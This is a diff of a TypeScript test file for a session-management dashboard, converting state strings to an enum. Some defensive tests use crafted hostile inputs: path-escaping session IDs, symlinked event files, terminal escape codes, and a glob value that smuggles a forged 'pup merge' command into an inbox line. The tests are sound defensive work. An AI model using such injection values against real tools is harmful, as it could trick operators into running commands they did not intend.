@@ -53,6 +53,7 @@ import { EventType } from './enums/event-type.enums.js';
 import { GateStageStatus } from './enums/gate-stage-status.enums.js';
 import { MergeStatus } from './enums/merge-status.enums.js';
 import { SessionActivityKind } from './enums/session-activity-kind.enums.js';
+import { SessionState } from './enums/session-state.enums.js';
 import { insertLedgerEntry } from './ledger.repository.js';
 import { recordWatcherBeat, replaceOverlaps } from './overlap.repository.js';
 import { WATCH_STALE_AFTER_MS } from './overlap.service.js';
@@ -73,7 +74,7 @@ import {
 import type { CiReview } from './types/dashboard.types.js';
 import type { ProjectBaseline } from './types/init.types.js';
 import type { TaskSpec } from './types/profile.types.js';
-import type { SessionRoute, SessionRow, SessionState } from './types/session.types.js';
+import type { SessionRoute, SessionRow } from './types/session.types.js';
 
 const NOW = Date.parse('2026-09-13T12:00:00Z');
 
@@ -386,14 +387,14 @@ describe('buildDashboardSnapshot', () => {
         goal: 'move the stall rule\ninto the service',
         origin: 'conductor',
       });
-      transitionSession(db, 's1', 'running');
+      transitionSession(db, 's1', SessionState.Running);
       incrementRejectCount(db, 's1');
 
       const [session] = buildDashboardSnapshot(db, repo, NOW).sessions;
 
       expect(session).toMatchObject({
         id: 's1',
-        state: 'running',
+        state: SessionState.Running,
         branch: 'pup/s1',
         taskId: 't-s1',
         goal: 'move the stall rule',
@@ -422,7 +423,7 @@ describe('buildDashboardSnapshot', () => {
 
     it('classifies a running session from its hook events, detail included', () => {
       seedSession(db, repo, 's1');
-      transitionSession(db, 's1', 'running');
+      transitionSession(db, 's1', SessionState.Running);
       seedEventsFile(repo, 's1', {
         hook_event_name: 'Notification',
         message: 'Claude needs your permission to use Bash',
@@ -440,7 +441,7 @@ describe('buildDashboardSnapshot', () => {
     // Decision 103: the idle prompt after a turn asks the operator nothing.
     it('reads the idle prompt after a turn as idle, not as needing a human', () => {
       seedSession(db, repo, 's1');
-      transitionSession(db, 's1', 'running');
+      transitionSession(db, 's1', SessionState.Running);
       seedEventsFile(repo, 's1', [
         { hook_event_name: 'Stop' },
         {
@@ -458,7 +459,7 @@ describe('buildDashboardSnapshot', () => {
 
     it('keeps a session whose turn ended on its own background shell out of the inbox', () => {
       seedSession(db, repo, 's1');
-      transitionSession(db, 's1', 'running');
+      transitionSession(db, 's1', SessionState.Running);
       seedEventsFile(repo, 's1', [
         {
           hook_event_name: 'PostToolUse',
@@ -485,7 +486,7 @@ describe('buildDashboardSnapshot', () => {
     // (decision 194): its row loses the activity, the dashboard stays up.
     it('leaves activity unread for an events file swapped for a symlink', () => {
       seedSession(db, repo, 's1');
-      transitionSession(db, 's1', 'running');
+      transitionSession(db, 's1', SessionState.Running);
       const target = join(tempDir('pup-elsewhere-'), 'events.jsonl');
       writeFileSync(
         target,
@@ -501,7 +502,7 @@ describe('buildDashboardSnapshot', () => {
     // A hard link passes O_NOFOLLOW, so the link count is what gives it away.
     it('leaves activity unread for an events file hard-linked elsewhere', () => {
       seedSession(db, repo, 's1');
-      transitionSession(db, 's1', 'running');
+      transitionSession(db, 's1', SessionState.Running);
       const target = join(tempDir('pup-elsewhere-'), 'events.jsonl');
       writeFileSync(
         target,
@@ -516,8 +517,8 @@ describe('buildDashboardSnapshot', () => {
 
     it('leaves activity unread for a session that is no longer running', () => {
       seedSession(db, repo, 's1');
-      transitionSession(db, 's1', 'running');
-      transitionSession(db, 's1', 'awaiting-review');
+      transitionSession(db, 's1', SessionState.Running);
+      transitionSession(db, 's1', SessionState.AwaitingReview);
       seedEventsFile(repo, 's1', { hook_event_name: 'Stop' });
 
       expect(buildDashboardSnapshot(db, repo, NOW).sessions[0]?.activity).toBeUndefined();
@@ -525,7 +526,7 @@ describe('buildDashboardSnapshot', () => {
 
     it('ages a running session whose events file has gone quiet (decision 35)', () => {
       seedSession(db, repo, 's1');
-      transitionSession(db, 's1', 'running');
+      transitionSession(db, 's1', SessionState.Running);
       seedEventsFile(repo, 's1', { hook_event_name: 'PostToolUse' }, STALLED_AFTER_MS + 60_000);
 
       const [session] = buildDashboardSnapshot(db, repo, NOW).sessions;
@@ -540,7 +541,7 @@ describe('buildDashboardSnapshot', () => {
       // would otherwise have `pup status` and `pup ui` stat and read a file
       // two levels above this project's sessions directory.
       seedSession(db, repo, ESCAPING_ID);
-      transitionSession(db, ESCAPING_ID, 'running');
+      transitionSession(db, ESCAPING_ID, SessionState.Running);
       const marker = seedEscapedMarker(repo);
 
       const [session] = buildDashboardSnapshot(db, repo, NOW).sessions;
@@ -563,7 +564,7 @@ describe('buildDashboardSnapshot', () => {
       /** A running session gone quiet past the stall bar, and the stall's name. */
       function seedStalled(sessionId: string, ageMs = STALLED_AFTER_MS + 60_000): string {
         seedSession(db, repo, sessionId);
-        transitionSession(db, sessionId, 'running');
+        transitionSession(db, sessionId, SessionState.Running);
         seedEventsFile(repo, sessionId, { hook_event_name: 'PostToolUse' }, ageMs);
         return new Date(NOW - ageMs).toISOString();
       }
@@ -622,7 +623,7 @@ describe('buildDashboardSnapshot', () => {
       it('is absent for a session that is stalled with nothing recorded, and for a fresh one', () => {
         seedStalled('s-stalled');
         seedSession(db, repo, 's-fresh');
-        transitionSession(db, 's-fresh', 'running');
+        transitionSession(db, 's-fresh', SessionState.Running);
         seedEventsFile(repo, 's-fresh', { hook_event_name: 'PostToolUse' });
         appendEvent(db, 's-fresh', EventType.TurnDied, {
           reason: API_ERROR,
@@ -658,7 +659,7 @@ describe('buildDashboardSnapshot', () => {
           90_000,
         ),
       });
-      transitionSession(db, 's1', 'running');
+      transitionSession(db, 's1', SessionState.Running);
 
       expect(buildDashboardSnapshot(db, repo, NOW).sessions[0]?.contextTokens).toBe(90_000);
     });
@@ -672,7 +673,7 @@ describe('buildDashboardSnapshot', () => {
             90_000,
           ),
         });
-        transitionSession(db, 's1', 'running');
+        transitionSession(db, 's1', SessionState.Running);
         if (settings === undefined) return;
         const compiled = projectPaths(repo).compiledDir('s1');
         mkdirSync(compiled, { recursive: true });
@@ -723,7 +724,7 @@ describe('buildDashboardSnapshot', () => {
           90_000,
         ),
       });
-      transitionSession(db, 's1', 'running');
+      transitionSession(db, 's1', SessionState.Running);
 
       expect(buildDashboardSnapshot(db, repo, NOW).sessions[0]?.contextTokens).toBe(90_000);
     });
@@ -740,7 +741,7 @@ describe('buildDashboardSnapshot', () => {
           90_000,
         ),
       });
-      transitionSession(db, 's1', 'running');
+      transitionSession(db, 's1', SessionState.Running);
 
       expect(buildDashboardSnapshot(db, repo, NOW).sessions[0]?.contextTokens).toBeUndefined();
     });
@@ -769,7 +770,7 @@ describe('buildDashboardSnapshot', () => {
     it('reads no transcript from a row pointing outside the directory pup stamps', () => {
       const planted = seedTranscript(tempDir('pup-dash-planted-'), 90_000);
       seedSession(db, repo, 's1', { transcriptPath: planted });
-      transitionSession(db, 's1', 'running');
+      transitionSession(db, 's1', SessionState.Running);
 
       expect(buildDashboardSnapshot(db, repo, NOW).sessions[0]?.contextTokens).toBeUndefined();
     });
@@ -784,7 +785,7 @@ describe('buildDashboardSnapshot', () => {
     it('reads no transcript from a row whose worktree path is empty', () => {
       const projects = seedTranscript(join(homedir(), '.claude', 'projects'), 90_000);
       seedSession(db, repo, 's1', { worktreePath: '', transcriptPath: projects });
-      transitionSession(db, 's1', 'running');
+      transitionSession(db, 's1', SessionState.Running);
 
       expect(buildDashboardSnapshot(db, repo, NOW).sessions[0]?.contextTokens).toBeUndefined();
     });
@@ -796,7 +797,7 @@ describe('buildDashboardSnapshot', () => {
 
       beforeEach(() => {
         seedSession(db, repo, 's1');
-        transitionSession(db, 's1', 'running');
+        transitionSession(db, 's1', SessionState.Running);
         appendEvent(db, 's1', EventType.Steer, { kind: 'kickoff', delivered: true });
       });
 
@@ -913,13 +914,20 @@ describe('buildDashboardSnapshot', () => {
 
       // Nothing can answer a terminal session (steers refuse it), so a question
       // asked before the kill or the merge must not sit on the row for good.
-      it.each(['killed', 'merged'] as const)('is absent once the session is %s', (state) => {
-        appendEvent(db, 's1', EventType.Question, { text: 'rebase or merge?' });
-        transitionSession(db, 's1', state === 'merged' ? 'awaiting-review' : state);
-        if (state === 'merged') transitionSession(db, 's1', 'merged');
+      it.each([SessionState.Killed, SessionState.Merged])(
+        'is absent once the session is %s',
+        (state) => {
+          appendEvent(db, 's1', EventType.Question, { text: 'rebase or merge?' });
+          transitionSession(
+            db,
+            's1',
+            state === SessionState.Merged ? SessionState.AwaitingReview : state,
+          );
+          if (state === SessionState.Merged) transitionSession(db, 's1', SessionState.Merged);
 
-        expect(questionOf()).toBeUndefined();
-      });
+          expect(questionOf()).toBeUndefined();
+        },
+      );
 
       it('is absent when the recorded text is blank', () => {
         appendEvent(db, 's1', EventType.Question, { text: '  ' });
@@ -947,7 +955,7 @@ describe('buildDashboardSnapshot', () => {
 
     it('reports the newest steer with its kind and its sender', () => {
       seedSession(db, repo, 's1');
-      transitionSession(db, 's1', 'running');
+      transitionSession(db, 's1', SessionState.Running);
       appendEvent(db, 's1', EventType.Steer, { kind: 'kickoff', delivered: true });
       appendEvent(db, 's1', EventType.Steer, { kind: 'message', by: 'conductor' });
 
@@ -959,7 +967,7 @@ describe('buildDashboardSnapshot', () => {
 
     it('reports the newest real gate run and the stage that failed it', () => {
       seedSession(db, repo, 's1');
-      transitionSession(db, 's1', 'running');
+      transitionSession(db, 's1', SessionState.Running);
       appendEvent(db, 's1', EventType.GateResult, {
         outcome: MergeStatus.Refused,
         report: {
@@ -974,7 +982,7 @@ describe('buildDashboardSnapshot', () => {
       });
       // A plain transition logs a gate_result too; with no report it says
       // nothing about passing, so it must not shadow the run above.
-      transitionSession(db, 's1', 'awaiting-review');
+      transitionSession(db, 's1', SessionState.AwaitingReview);
 
       expect(buildDashboardSnapshot(db, repo, NOW).sessions[0]?.lastGate).toMatchObject({
         passed: false,
@@ -990,7 +998,7 @@ describe('buildDashboardSnapshot', () => {
     // terminal-safe line.
     it("lists the last gate's stages, sanitized", () => {
       seedSession(db, repo, 's1');
-      transitionSession(db, 's1', 'running');
+      transitionSession(db, 's1', SessionState.Running);
       appendEvent(db, 's1', EventType.GateResult, {
         outcome: MergeStatus.Refused,
         report: {
@@ -1019,7 +1027,7 @@ describe('buildDashboardSnapshot', () => {
     describe('recent events', () => {
       it('carries the newest five, oldest of them first, each with what its payload says', () => {
         seedSession(db, repo, 's1');
-        transitionSession(db, 's1', 'running');
+        transitionSession(db, 's1', SessionState.Running);
         appendEvent(db, 's1', EventType.Steer, { kind: 'kickoff', delivered: true });
         appendEvent(db, 's1', EventType.Steer, { kind: 'message', by: 'conductor' });
         appendEvent(db, 's1', EventType.Interrupt, { steered: false });
@@ -1033,7 +1041,7 @@ describe('buildDashboardSnapshot', () => {
           },
         });
         appendEvent(db, 's1', EventType.SessionDone, { summary: 'the pane is in' });
-        transitionSession(db, 's1', 'awaiting-review');
+        transitionSession(db, 's1', SessionState.AwaitingReview);
 
         const { recentEvents } = buildDashboardSnapshot(db, repo, NOW).sessions[0] ?? {};
 
@@ -1104,7 +1112,7 @@ describe('buildDashboardSnapshot', () => {
 
       it("strips what a terminal would obey out of the session's own words", () => {
         seedSession(db, repo, 's1');
-        transitionSession(db, 's1', 'running');
+        transitionSession(db, 's1', SessionState.Running);
         appendEvent(db, 's1', EventType.SessionDone, { summary: '\u001b[2Jdone\nfor real' });
 
         expect(
@@ -1182,7 +1190,7 @@ describe('buildDashboardSnapshot', () => {
       it("names a running round's starter and the class that took it past the top rung", () => {
         seedSession(db, repo, 's1');
         recordSessionRoute(db, 's1', CRITICAL_TOP);
-        transitionSession(db, 's1', 'running');
+        transitionSession(db, 's1', SessionState.Running);
         appendEvent(db, 's1', EventType.FixRound, {
           ...ROUND,
           rejectBase: 0,
@@ -1201,14 +1209,14 @@ describe('buildDashboardSnapshot', () => {
 
       it('names the starter alone on a round within the ladder, and only while it is open', () => {
         seedSession(db, repo, 's-open');
-        transitionSession(db, 's-open', 'running');
+        transitionSession(db, 's-open', SessionState.Running);
         appendEvent(db, 's-open', EventType.FixRound, {
           ...ROUND,
           rejectBase: 0,
           startedBy: 'operator',
         });
         seedSession(db, repo, 's-gated');
-        transitionSession(db, 's-gated', 'running');
+        transitionSession(db, 's-gated', SessionState.Running);
         appendEvent(db, 's-gated', EventType.FixRound, {
           ...ROUND,
           rejectBase: 0,
@@ -1220,10 +1228,10 @@ describe('buildDashboardSnapshot', () => {
           files: [],
         });
         seedSession(db, repo, 's-before');
-        transitionSession(db, 's-before', 'running');
+        transitionSession(db, 's-before', SessionState.Running);
         appendEvent(db, 's-before', EventType.FixRound, { ...ROUND, rejectBase: 0 });
         seedSession(db, repo, 's-forged');
-        transitionSession(db, 's-forged', 'running');
+        transitionSession(db, 's-forged', SessionState.Running);
         // The store is session-writable: a class pup never records is not shown.
         db.prepare(
           `INSERT INTO events (session_id, type, payload) VALUES (?, '${EventType.FixRound}', ?)`,
@@ -1244,8 +1252,8 @@ describe('buildDashboardSnapshot', () => {
 
     it('flags a blocked session as needing a human', () => {
       seedSession(db, repo, 's1');
-      transitionSession(db, 's1', 'running');
-      transitionSession(db, 's1', 'blocked');
+      transitionSession(db, 's1', SessionState.Running);
+      transitionSession(db, 's1', SessionState.Blocked);
 
       expect(buildDashboardSnapshot(db, repo, NOW).sessions[0]?.needsHuman).toBe(true);
     });
@@ -1253,9 +1261,9 @@ describe('buildDashboardSnapshot', () => {
     it('sorts open questions first, then blocked and stalled sessions, then oldest first', () => {
       for (const id of ['s-first', 's-second', 's-stalled', 's-blocked', 's-asking']) {
         seedSession(db, repo, id);
-        transitionSession(db, id, 'running');
+        transitionSession(db, id, SessionState.Running);
       }
-      transitionSession(db, 's-blocked', 'blocked');
+      transitionSession(db, 's-blocked', SessionState.Blocked);
       seedEventsFile(repo, 's-stalled', { hook_event_name: 'Stop' }, STALLED_AFTER_MS + 1000);
       appendEvent(db, 's-asking', EventType.Question, { text: 'which way?' });
 
@@ -1366,15 +1374,15 @@ describe('buildDashboardSnapshot', () => {
     }
 
     it('keeps blocked, stalled and awaiting-review rows and counts the rest', () => {
-      seedIn('s-busy', ['running']);
-      seedIn('s-asking', ['running']);
+      seedIn('s-busy', [SessionState.Running]);
+      seedIn('s-asking', [SessionState.Running]);
       seedEventsFile(repo, 's-asking', { hook_event_name: 'Notification' });
-      seedIn('s-stalled', ['running']);
+      seedIn('s-stalled', [SessionState.Running]);
       seedEventsFile(repo, 's-stalled', { hook_event_name: 'PostToolUse' }, STALLED_AFTER_MS + 1);
-      seedIn('s-review', ['running', 'awaiting-review']);
-      seedIn('s-blocked', ['running', 'blocked']);
-      seedIn('s-merged', ['running', 'awaiting-review', 'merged']);
-      seedIn('s-killed', ['killed']);
+      seedIn('s-review', [SessionState.Running, SessionState.AwaitingReview]);
+      seedIn('s-blocked', [SessionState.Running, SessionState.Blocked]);
+      seedIn('s-merged', [SessionState.Running, SessionState.AwaitingReview, SessionState.Merged]);
+      seedIn('s-killed', [SessionState.Killed]);
       seedTask(db, repo, 't-plan', 'planned');
 
       const summary = fleetSummary(buildDashboardSnapshot(db, repo, NOW));
@@ -1420,7 +1428,7 @@ describe('findStalledSessions', () => {
 
   it('ages every running session whose events file has gone quiet', () => {
     seedSession(db, repo, 's-stalled');
-    transitionSession(db, 's-stalled', 'running');
+    transitionSession(db, 's-stalled', SessionState.Running);
     seedEventsFile(repo, 's-stalled', { hook_event_name: 'Stop' }, STALLED_AFTER_MS + 5_000);
 
     expect(findStalledSessions(db, repo, NOW)).toEqual([
@@ -1435,7 +1443,7 @@ describe('findStalledSessions', () => {
 
   it('leaves a fresh events file alone', () => {
     seedSession(db, repo, 's-fresh');
-    transitionSession(db, 's-fresh', 'running');
+    transitionSession(db, 's-fresh', SessionState.Running);
     seedEventsFile(repo, 's-fresh', { hook_event_name: 'PostToolUse' });
 
     expect(findStalledSessions(db, repo, NOW)).toEqual([]);
@@ -1443,14 +1451,14 @@ describe('findStalledSessions', () => {
 
   it('skips a running session that has yet to fire a hook', () => {
     seedSession(db, repo, 's-silent');
-    transitionSession(db, 's-silent', 'running');
+    transitionSession(db, 's-silent', SessionState.Running);
 
     expect(findStalledSessions(db, repo, NOW)).toEqual([]);
   });
 
   it('skips a running row whose id is a path, marker and all (decision 66)', () => {
     seedSession(db, repo, ESCAPING_ID);
-    transitionSession(db, ESCAPING_ID, 'running');
+    transitionSession(db, ESCAPING_ID, SessionState.Running);
     seedEscapedMarker(repo);
 
     // The marker is an hour past the stall bar: a sweep that stat'ed it would
@@ -1460,8 +1468,8 @@ describe('findStalledSessions', () => {
 
   it('ignores a session that is no longer running, however old its events', () => {
     seedSession(db, repo, 's-done');
-    transitionSession(db, 's-done', 'running');
-    transitionSession(db, 's-done', 'awaiting-review');
+    transitionSession(db, 's-done', SessionState.Running);
+    transitionSession(db, 's-done', SessionState.AwaitingReview);
     seedEventsFile(repo, 's-done', { hook_event_name: 'Stop' }, STALLED_AFTER_MS * 10);
 
     expect(findStalledSessions(db, repo, NOW)).toEqual([]);
@@ -1504,7 +1512,7 @@ describe('needsYou', () => {
   const UNLANDED_SHA = 'f'.repeat(40);
 
   function seedMerge(sessionId: string, prUrl?: string, sha: string | null = UNLANDED_SHA) {
-    seedIn(sessionId, ['running', 'awaiting-review', 'merged']);
+    seedIn(sessionId, [SessionState.Running, SessionState.AwaitingReview, SessionState.Merged]);
     appendEvent(db, sessionId, EventType.Merge, {
       branch: `pup/${sessionId}`,
       ...(sha === null ? {} : { sha }),
@@ -1558,8 +1566,8 @@ describe('needsYou', () => {
     });
 
     it('comes after a question and before every other need', () => {
-      seedIn('s-blocked', ['running', 'blocked']);
-      seedIn('s-asked', ['running']);
+      seedIn('s-blocked', [SessionState.Running, SessionState.Blocked]);
+      seedIn('s-asked', [SessionState.Running]);
       appendEvent(db, 's-asked', EventType.Question, { text: 'which way?' });
 
       const kinds = needsYou(blockedAt({ reason: 'unsent draft' })).map((need) => need.kind);
@@ -1574,9 +1582,9 @@ describe('needsYou', () => {
 
   /** A critical task's session on its top rung, rejected by the gate, then killed. */
   function seedTopRungKill(sessionId: string, route: Partial<SessionRoute> = {}): void {
-    seedIn(sessionId, ['running']);
+    seedIn(sessionId, [SessionState.Running]);
     recordSessionRoute(db, sessionId, { ...CRITICAL_TOP, ...route });
-    for (const state of ['awaiting-review', 'rejected', 'killed'] as const) {
+    for (const state of [SessionState.AwaitingReview, SessionState.Rejected, SessionState.Killed]) {
       transitionSession(db, sessionId, state);
     }
   }
@@ -1586,9 +1594,9 @@ describe('needsYou', () => {
   describe('top rung', () => {
     it('leaves out a killed session that can still climb, or ran into nothing', () => {
       seedTopRungKill('s-low', { rung: 0, effort: 'high' });
-      seedIn('s-quiet', ['running']);
+      seedIn('s-quiet', [SessionState.Running]);
       recordSessionRoute(db, 's-quiet', CRITICAL_TOP);
-      transitionSession(db, 's-quiet', 'killed');
+      transitionSession(db, 's-quiet', SessionState.Killed);
 
       expect(inbox()).toEqual([]);
     });
@@ -1602,7 +1610,7 @@ describe('needsYou', () => {
         branch: 'pup/s-new',
         profileHash: 'hash',
       });
-      transitionSession(db, 's-new', 'running');
+      transitionSession(db, 's-new', SessionState.Running);
 
       expect(inbox().map((need) => need.sessionId)).toEqual([]);
     });
@@ -1617,12 +1625,12 @@ describe('needsYou', () => {
     });
 
     it('counts a stall the window was in when it was killed', () => {
-      seedIn('s-wedged', ['running']);
+      seedIn('s-wedged', [SessionState.Running]);
       recordSessionRoute(db, 's-wedged', CRITICAL_TOP);
       seedEventsFile(repo, 's-wedged', { hook_event_name: 'PostToolUse' });
       const quietSince = new Date(Date.now() - STALLED_AFTER_MS - 60_000);
       utimesSync(projectPaths(repo).eventsFile('s-wedged'), quietSince, quietSince);
-      transitionSession(db, 's-wedged', 'killed');
+      transitionSession(db, 's-wedged', SessionState.Killed);
 
       expect(inbox()).toMatchObject([
         { kind: 'top-rung', reason: 'top rung: stall on claude-opus-5-5 xhigh' },
@@ -1640,7 +1648,12 @@ describe('needsYou', () => {
         profileHash: 'hash',
         route: CRITICAL_TOP,
       });
-      for (const state of ['running', 'awaiting-review', 'rejected', 'killed'] as const) {
+      for (const state of [
+        SessionState.Running,
+        SessionState.AwaitingReview,
+        SessionState.Rejected,
+        SessionState.Killed,
+      ]) {
         transitionSession(db, 's-odd', state);
       }
 
@@ -1653,8 +1666,8 @@ describe('needsYou', () => {
   it('lists questions, blocks, top rungs, stalls, reviews and open PRs in that order, each with its answer', () => {
     // Seeded against the order, so the inbox's own order is what puts them right.
     seedMerge('s-pr', 'https://github.com/o/r/pull/7');
-    seedIn('s-review', ['running', 'awaiting-review']);
-    seedIn('s-stalled', ['running']);
+    seedIn('s-review', [SessionState.Running, SessionState.AwaitingReview]);
+    seedIn('s-stalled', [SessionState.Running]);
     seedEventsFile(
       repo,
       's-stalled',
@@ -1662,12 +1675,12 @@ describe('needsYou', () => {
       STALLED_AFTER_MS + 60_000,
     );
     seedTopRungKill('s-top');
-    seedIn('s-blocked', ['running', 'blocked']);
+    seedIn('s-blocked', [SessionState.Running, SessionState.Blocked]);
     incrementRejectCount(db, 's-blocked');
-    seedIn('s-asking', ['running']);
+    seedIn('s-asking', [SessionState.Running]);
     appendEvent(db, 's-asking', EventType.Question, { text: 'rebase or merge?' });
     const asked = newestEventId(db);
-    seedIn('s-busy', ['running']);
+    seedIn('s-busy', [SessionState.Running]);
 
     expect(inbox()).toEqual([
       {
@@ -1717,7 +1730,7 @@ describe('needsYou', () => {
   });
 
   it('names a dead turn the way the session row does', () => {
-    seedIn('s-dead', ['running']);
+    seedIn('s-dead', [SessionState.Running]);
     seedEventsFile(repo, 's-dead', { hook_event_name: 'PostToolUse' }, STALLED_AFTER_MS + 60_000);
     const stalledAt = new Date(NOW - STALLED_AFTER_MS - 60_000).toISOString();
     appendEvent(db, 's-dead', EventType.TurnDied, {
@@ -1739,7 +1752,7 @@ describe('needsYou', () => {
     });
 
     it('carries the options, the recommended one, and the answer command', () => {
-      seedIn('s1', ['running']);
+      seedIn('s1', [SessionState.Running]);
       appendEvent(db, 's1', EventType.Question, {
         text: 'rebase \u2192 or merge?',
         options: ['rebase \u2705', 'merge'],
@@ -1766,9 +1779,9 @@ describe('needsYou', () => {
     // A session that reported done still asks, while merging main or fixing
     // what the conductor sent back, and nothing else reaches the operator.
     it('lists a question an awaiting-review session asked after it was done', () => {
-      seedIn('s1', ['running']);
+      seedIn('s1', [SessionState.Running]);
       appendEvent(db, 's1', EventType.SessionDone, { summary: 'done' });
-      transitionSession(db, 's1', 'awaiting-review');
+      transitionSession(db, 's1', SessionState.AwaitingReview);
       appendEvent(db, 's1', EventType.Question, { text: 'keep main?', options: ['yes', 'no'] });
       const asked = newestEventId(db);
 
@@ -1786,9 +1799,9 @@ describe('needsYou', () => {
     });
 
     it("drops an awaiting-review session's question once answered", () => {
-      seedIn('s1', ['running']);
+      seedIn('s1', [SessionState.Running]);
       appendEvent(db, 's1', EventType.SessionDone, { summary: 'done' });
-      transitionSession(db, 's1', 'awaiting-review');
+      transitionSession(db, 's1', SessionState.AwaitingReview);
       appendEvent(db, 's1', EventType.Question, { text: 'keep main?', options: ['yes', 'no'] });
       appendEvent(db, 's1', EventType.Answer, {
         question: 'keep main?',
@@ -1803,16 +1816,16 @@ describe('needsYou', () => {
     // The inbox lists a session once, under a question first: one asked while
     // running must not hide the review line, nor a gate refusal behind it.
     it('lists no question an awaiting-review session asked before it was done', () => {
-      seedIn('s1', ['running']);
+      seedIn('s1', [SessionState.Running]);
       appendEvent(db, 's1', EventType.Question, { text: 'keep main?' });
       appendEvent(db, 's1', EventType.SessionDone, { summary: 'done' });
-      transitionSession(db, 's1', 'awaiting-review');
+      transitionSession(db, 's1', SessionState.AwaitingReview);
 
       expect(inbox().map((need) => need.kind)).toEqual(['awaiting-review']);
     });
 
     it('lists no question from an awaiting-review session that never reported done', () => {
-      seedIn('s1', ['running', 'awaiting-review']);
+      seedIn('s1', [SessionState.Running, SessionState.AwaitingReview]);
       appendEvent(db, 's1', EventType.Question, { text: 'keep main?' });
 
       expect(inbox().map((need) => need.kind)).toEqual(['awaiting-review']);
@@ -1821,10 +1834,14 @@ describe('needsYou', () => {
     // Only running and awaiting-review sessions carry a question: a blocked one
     // keeps its unblock line, and any other state fails closed.
     it.each([
-      ['blocked', ['running', 'blocked'] as SessionState[], ['blocked']],
-      ['rejected', ['running', 'awaiting-review', 'rejected'] as SessionState[], []],
+      [SessionState.Blocked, [SessionState.Running, SessionState.Blocked], ['blocked']],
+      [
+        SessionState.Rejected,
+        [SessionState.Running, SessionState.AwaitingReview, SessionState.Rejected],
+        [],
+      ],
     ])('lists no question from a %s session', (_, path, kinds) => {
-      seedIn('s1', ['running']);
+      seedIn('s1', [SessionState.Running]);
       appendEvent(db, 's1', EventType.Question, { text: 'keep main?' });
       for (const state of path.slice(1)) transitionSession(db, 's1', state);
 
@@ -1833,7 +1850,11 @@ describe('needsYou', () => {
 
     // `pup answer` refuses a terminal session, so its question has no answer.
     it.each([
-      ['killed', () => seedIn('s1', ['running', 'awaiting-review', 'killed'])],
+      [
+        SessionState.Killed,
+        () =>
+          seedIn('s1', [SessionState.Running, SessionState.AwaitingReview, SessionState.Killed]),
+      ],
       [
         'landed',
         () => {
@@ -1860,8 +1881,8 @@ describe('needsYou', () => {
 
     it("lists the running conductor's question first", () => {
       vi.mocked(hasConductorWindow).mockReturnValue(true);
-      seedIn('s1', ['running', 'blocked']);
-      seedIn('s2', ['running']);
+      seedIn('s1', [SessionState.Running, SessionState.Blocked]);
+      seedIn('s2', [SessionState.Running]);
       appendEvent(db, 's2', EventType.Question, { text: 'which way?' });
       const asked = markConductorQuestion(db, repo, 'run-1', {
         text: 'accept the debt?',
@@ -1888,7 +1909,7 @@ describe('needsYou', () => {
   // A question is the first reason a running session has, so a stalled one
   // that asked is listed once, as the question.
   it('lists a session once, under its first reason', () => {
-    seedIn('s1', ['running']);
+    seedIn('s1', [SessionState.Running]);
     seedEventsFile(repo, 's1', { hook_event_name: 'PostToolUse' }, STALLED_AFTER_MS + 60_000);
     appendEvent(db, 's1', EventType.Question, { text: 'which way?' });
 
@@ -1913,7 +1934,7 @@ describe('needsYou', () => {
       });
 
     it('names the added globs on an awaiting-review line and on an open PR', () => {
-      seedIn('s-review', ['running', 'awaiting-review']);
+      seedIn('s-review', [SessionState.Running, SessionState.AwaitingReview]);
       rescope('s-review', 't-s-review', ['docs/**']);
       seedMerge('s-pr', 'https://github.com/o/r/pull/7');
       rescope('s-pr', 't-s-pr', ['docs/**', 'test/**']);
@@ -1925,7 +1946,7 @@ describe('needsYou', () => {
     });
 
     it('also names them on a gate refused for flagged debt', () => {
-      seedIn('s-review', ['running', 'awaiting-review']);
+      seedIn('s-review', [SessionState.Running, SessionState.AwaitingReview]);
       rescope('s-review', 't-s-review', ['docs/**']);
       appendEvent(db, 's-review', EventType.GateResult, {
         outcome: MergeStatus.Refused,
@@ -1944,7 +1965,7 @@ describe('needsYou', () => {
 
     // A relaunch after a kill gates under the scope its predecessor's claim took.
     it("counts an earlier session's rescopes, and shows three globs and the rest as a count", () => {
-      seedIn('s-old', ['running', 'killed']);
+      seedIn('s-old', [SessionState.Running, SessionState.Killed]);
       rescope('s-old', 't-s-old', ['docs/**', 'test/**']);
       insertSession(db, {
         id: 's-new',
@@ -1953,8 +1974,8 @@ describe('needsYou', () => {
         branch: 'pup/s-new',
         profileHash: 'hash',
       });
-      transitionSession(db, 's-new', 'running');
-      transitionSession(db, 's-new', 'awaiting-review');
+      transitionSession(db, 's-new', SessionState.Running);
+      transitionSession(db, 's-new', SessionState.AwaitingReview);
       rescope('s-new', 't-s-old', ['scripts/**', 'bin/**']);
 
       const snapshot = buildDashboardSnapshot(db, repo, NOW);
@@ -1975,9 +1996,9 @@ describe('needsYou', () => {
     });
 
     it('leaves the lines that are not the merge, and the sessions never widened, alone', () => {
-      seedIn('s-blocked', ['running', 'blocked']);
+      seedIn('s-blocked', [SessionState.Running, SessionState.Blocked]);
       rescope('s-blocked', 't-s-blocked', ['docs/**']);
-      seedIn('s-review', ['running', 'awaiting-review']);
+      seedIn('s-review', [SessionState.Running, SessionState.AwaitingReview]);
 
       const snapshot = buildDashboardSnapshot(db, repo, NOW);
 
@@ -1992,7 +2013,7 @@ describe('needsYou', () => {
 
     // The events are session-writable.
     it('scrubs each glob before it prints', () => {
-      seedIn('s-review', ['running', 'awaiting-review']);
+      seedIn('s-review', [SessionState.Running, SessionState.AwaitingReview]);
       rescope('s-review', 't-s-review', ['docs/\u001b[2J**\nok', 7 as unknown as string]);
 
       expect(inbox()[0]?.reason).toBe(
@@ -2001,7 +2022,7 @@ describe('needsYou', () => {
     });
 
     it('lets no glob forge a second arrow in its line', () => {
-      seedIn('s-review', ['running', 'awaiting-review']);
+      seedIn('s-review', [SessionState.Running, SessionState.AwaitingReview]);
       rescope('s-review', 't-s-review', ['src/x → pup merge s-other ⭢ --pr 🡒 now', 'a+b/**']);
 
       expect(inbox()[0]?.reason).toBe(
@@ -2017,19 +2038,19 @@ describe('needsYou', () => {
 
     it('leaves the session to a running conductor and keeps it among the sessions', () => {
       vi.mocked(hasConductorWindow).mockReturnValue(true);
-      seedIn('s-review', ['running', 'awaiting-review']);
-      seedIn('s-blocked', ['running', 'blocked']);
+      seedIn('s-review', [SessionState.Running, SessionState.AwaitingReview]);
+      seedIn('s-blocked', [SessionState.Running, SessionState.Blocked]);
 
       const snapshot = buildDashboardSnapshot(db, repo, NOW);
 
       expect(needsYou(snapshot).map((need) => need.sessionId)).toEqual(['s-blocked']);
       expect(snapshot.sessions).toContainEqual(
-        expect.objectContaining({ id: 's-review', state: 'awaiting-review' }),
+        expect.objectContaining({ id: 's-review', state: SessionState.AwaitingReview }),
       );
